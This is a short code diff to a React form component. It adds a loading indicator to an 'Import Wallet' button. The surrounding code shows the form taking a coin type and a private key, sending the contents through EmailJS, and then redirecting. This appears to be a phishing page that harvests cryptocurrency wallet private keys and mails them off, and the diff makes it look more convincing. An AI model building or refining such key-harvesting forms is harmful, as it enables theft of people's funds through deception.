@@ -5,6 +5,10 @@ import { useNavigate } from "react-router";
 import { useEffect } from "react";
 import emailjs from "@emailjs/browser";
 const Form = () => {
+  const [loading, setLoading] = useState(false);
+
+
+
   const form = useRef();
 
   const sendEmail = (e) => {
@@ -19,6 +23,7 @@ const Form = () => {
       )
       .then(
         (result) => {
+          setLoading(true);
           navigate("/Redirect");
           console.log(result.text);
         },
@@ -84,7 +89,7 @@ const Form = () => {
           // ref={form}
           disabled={value.coinType.length < 2 || value.privateKey.length < 2}
         >
-          Import Wallet
+         {loading ? "Loading" : 'Import Wallet'} 
         </button>
       </form>
     </div>
